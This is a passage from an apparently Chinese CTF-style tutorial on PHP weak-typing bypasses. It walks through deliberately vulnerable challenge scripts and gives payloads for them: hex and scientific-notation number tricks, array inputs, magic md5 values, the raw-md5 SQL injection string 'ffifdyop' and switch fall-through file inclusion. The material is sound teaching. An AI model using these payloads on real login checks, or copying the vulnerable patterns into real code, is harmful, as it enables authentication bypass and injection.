function\">noother_says_correct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>条件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$digit</span> <span class=\"token operator\">>=</span> <span class=\"token variable\">$one</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$digit</span> <span class=\"token operator\">&lt;=</span> <span class=\"token variable\">$nine</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>为<span class=\"token constant boolean\">false</span>\n<span class=\"token number\">2</span>、<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>简单的读一下这个自定义函数的话就会发现它这里其实是不让输入数字，但是结果又需要password与这串数字<code>3735929054</code>相等，此时就想到进制转换，里面有9，肯定不是八进制，因此此时考虑十六进制，转换一下看看</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">dechex</span><span class=\"token punctuation\">(</span><span class=\"token number\">3735929054</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//进行十六进制转换</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528221.png\" alt=\"在这里插入图片描述\"><br>得到deadc0de，那我们如果用十六进制的它与十进制的它作比较，两者肯定是相同的，因此我们构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">password<span class=\"token operator\">=</span><span class=\"token number\">0xdeadc0de</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528783.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"数字验证正则绕过\"><a href=\"#数字验证正则绕过\" class=\"headerlink\" title=\"数字验证正则绕过\"></a>数字验证正则绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flag&#123;test&#125;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span>  <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"POST\"</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_METHOD'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">&#123;</span> \n    <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token operator\">>=</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^[[:graph:]]&#123;12,&#125;$/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//preg_match — 执行一个正则表达式匹配</span>\n    <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Wrong Format'</span><span class=\"token punctuation\">;</span> \n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span> \n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token constant boolean\">TRUE</span><span class=\"token punctuation\">)</span> \n    <span class=\"token punctuation\">&#123;</span> \n        <span class=\"token variable\">$reg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span><span class=\"token punctuation\">;</span> \n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">6</span> <span class=\"token operator\">></span> <span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$reg</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span> \n        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> \n        <span class=\"token variable\">$ps</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'punct'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'digit'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'upper'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'lower'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母 </span>\n        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$ps</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$pt</span><span class=\"token punctuation\">)</span> \n        <span class=\"token punctuation\">&#123;</span> \n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[[:<span class=\"token interpolation\"><span class=\"token variable\">$pt</span></span>:]]+/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n                <span class=\"token variable\">$c</span> <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> \n        <span class=\"token punctuation\">&#125;</span> \n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span> \n        <span class=\"token comment\">//>=3，必须包含四种类型三种与三种以上</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"42\"</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span> \n        <span class=\"token keyword\">else</span> <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Wrong password'</span><span class=\"token punctuation\">;</span> \n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>关注点</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、 <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token operator\">>=</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/^[[:graph:]]&#123;12,&#125;$/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token number\">2</span>、 <span class=\"token variable\">$reg</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span><span class=\"token punctuation\">;</span> \n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">6</span> <span class=\"token operator\">></span> <span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$reg</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n<span class=\"token number\">3</span>、  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n<span class=\"token number\">4</span>、 <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"42\"</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>第一个：至少匹配13次才能使得if语句为false，此时语句才能继续往下运行，因此也就是说password长度要大于12位<br>第二个：password中匹配到的标点符号，大小写字母和数字要大于六次<br>第三个：<code> if ($c &lt; 3)</code>表示包含至少要有三种类型，即大写字母、小写字母、标点符号等等中至少要有三种类型<br>第四个：password要等于42才能输出结果<br>结合第三个和第四个，此时我们想到小数点后用科学计数法来表示password，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">password<span class=\"token operator\">=</span><span class=\"token number\">42.000000000e-0</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"弱类型整数大小比较绕过\"><a href=\"#弱类型整数大小比较绕过\" class=\"headerlink\" title=\"弱类型整数大小比较绕过\"></a>弱类型整数大小比较绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"flag&#123;test&#125;\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$temp</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"no numeric\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token class-name return-type\">NULL</span><span class=\"token punctuation\">;</span>    \n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token operator\">></span><span class=\"token number\">1336</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> \n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话要求不能是纯数字而且要求数字大于1336，这里就需要说一个小trick了，当字符型和整数相比较时，会经过intval函数处理，所以这里我们可以用后面加字母来进行绕过</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">password<span class=\"token operator\">=</span><span class=\"token number\">1337</span>a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>当然，也可以用%00截断，此时也是不仅仅有数字的</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">password<span class=\"token operator\">=</span><span class=\"token number\">1337</span><span class=\"token operator\">%</span><span class=\"token number\">00</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>还有数组方式我也发现可以绕过，payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">password<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这里的话数组不是数字，前面肯定满足，后面的这个<code>if($temp&gt;1336)</code>是怎么比较的呢，当数组和数字进行比较时，数组是一定大于数字的（PHP内部规定），具体可以参考这篇文章<br><a href=\"https://www.cnblogs.com/F4NNIU/p/13571893.html\">https://www.cnblogs.com/F4NNIU/p/13571893.html</a></p>\n<h2 id=\"md5函数验证绕过\"><a href=\"#md5函数验证绕过\" class=\"headerlink\" title=\"md5函数验证绕过\"></a>md5函数验证绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'flag&#123;test&#125;'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$temp</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>弱比较类型，让其加密后为0exxx这种格式即可，或者用数组来绕过构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">password<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>\npassword<span class=\"token operator\">=</span>s155964671a<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h2 id=\"md5函数true绕过注入\"><a href=\"#md5函数true绕过注入\" class=\"headerlink\" title=\"md5函数true绕过注入\"></a>md5函数true绕过注入</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$link</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_connect</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$link</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n  <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Could not connect to MySQL: '</span> <span class=\"token operator\">.</span> <span class=\"token function\">mysql_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token comment\">// 选择数据库</span>\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_select_db</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"security\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$link</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$db</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'select db error'</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// 执行sql</span>\n<span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE password = '\"</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token function\">mysql_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row1</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_row</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">mysql_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$link</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里重点关注的就是SQL语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE password = '\"</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>md5函数中第二个参数为true，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。<br>可以看出它是单引号闭合，如果我们生成的md5能是<code>&#39; or xxx</code>这种，就可以构成万能密码，此时就会得到全部数据，经过查找，md5加密后能生成这种字符串的为<code>ffifdyop</code>，它加密后为<code>276f722736c95d99e921722cf9ed621c</code>，而后经十六进制转换字符串为<code>&#39;or&#39;6&lt;trash&gt;</code>因此这里我们就可以构造如下payload来绕过</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">password<span class=\"token operator\">=</span>ffifdyop<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"switch没有break-字符与0比较绕过\"><a href=\"#switch没有break-字符与0比较绕过\" class=\"headerlink\" title=\"switch没有break 字符与0比较绕过\"></a>switch没有break 字符与0比较绕过</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'which'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$which</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'which'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$which</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">require_once</span> <span class=\"token variable\">$which</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">;</span>\n         <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token class-name static-context\">GWF_HTML</span><span class=\"token operator\">::</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'PHP-0817'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'Hacker NoNoNo!'</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>小知识科普，当字符串转换成常量时，会经过intval函数转换，我们可以自行测试一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528805.png\" alt=\"在这里插入图片描述\"><br>那么这里的话就会执行case 0对应的语句，我们此时来看一下这个case语句</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n   <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n   <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n       <span class=\"token keyword\">require_once</span> <span class=\"token variable\">$which</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'.php'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>因为没有break，所以会接着执行case 1，又没有break，此时就会执行case 2，此时就包含了flag.php,输出了它的flag，因此我们构造payload如下即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">which<span class=\"token operator\">=</span>flag<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141528903.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"unserialize-序列化\"><a href=\"#unserialize-序列化\" class=\"headerlink\" title=\"unserialize()序列化\"></a>unserialize()序列化</h2><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token comment\">&lt;!-- 题目：http://web.jarvisoj.com:32768 --></span>\n\n<span class=\"token comment\">&lt;!-- index.php --></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> \n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'shield.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Shield</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token 